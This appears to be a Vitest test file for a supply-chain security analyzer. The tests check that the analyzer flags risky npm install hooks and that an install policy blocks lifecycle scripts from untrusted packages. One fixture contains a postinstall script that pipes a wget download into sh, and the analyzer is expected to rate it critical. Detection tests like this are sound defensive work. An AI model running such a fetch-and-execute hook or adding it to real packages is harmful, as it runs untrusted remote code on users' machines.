import { describe, it, expect } from 'vitest';
import path from 'node:path';
import os from 'node:os';
import { promises as fs } from 'node:fs';
import { analyze } from '../../src/security/supply-chain/PackageScriptAnalyzer.js';
import { evaluateInstallScripts } from '../../src/security/supply-chain/InstallScriptPolicy.js';

describe('PackageScriptAnalyzer', () => {
  it('detects critical pipe-to-shell in script', async () => {
    const d = await fs.mkdtemp(path.join(os.tmpdir(), 'psa-'));
    await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({ scripts: { postinstall: 'wget https://x | sh' } }));
    const r = await analyze(d);
    expect(r.findings.some((f) => f.severity === 'critical')).toBe(true);
  });
  it('lifecycle hooks listed', async () => {
    const d = await fs.mkdtemp(path.join(os.tmpdir(), 'psa-'));
    await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({ scripts: { preinstall: 'echo hi', test: 'vitest' } }));
    const r = await analyze(d);
    expect(r.lifecycle_scripts).toContain('preinstall');
  });
  it('install policy blocks lifecycle on untrusted', async () => {
    const d = await fs.mkdtemp(path.join(os.tmpdir(), 'psa-'));
    await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({ scripts: { postinstall: 'node x.js' } }));
    const r = await analyze(d);
    const dec = evaluateInstallScripts(r, 'untrusted');
    expect(dec.allowed).toBe(false);
  });
});
